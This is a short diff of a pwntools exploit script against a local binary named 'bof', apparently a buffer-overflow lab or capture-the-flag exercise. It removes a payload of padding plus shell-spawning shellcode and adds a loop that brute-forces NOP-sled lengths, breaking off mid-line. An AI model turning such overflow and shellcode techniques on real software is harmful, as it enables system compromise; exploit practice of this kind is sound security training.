@@ -7,8 +7,6 @@ context.terminal = ['tmux', 'splitw', '-h']
 p = process("./bof")
 e = ELF("./bof")
 
-payload = b"A"*88
-sh = shellcraft.i386.linux.sh()
-payload += sh
-p.sendline(payload)
-p.interactive()
+for i in range(40,100):
+    p = process("./bof")
+    payload = "\x90"*i + 
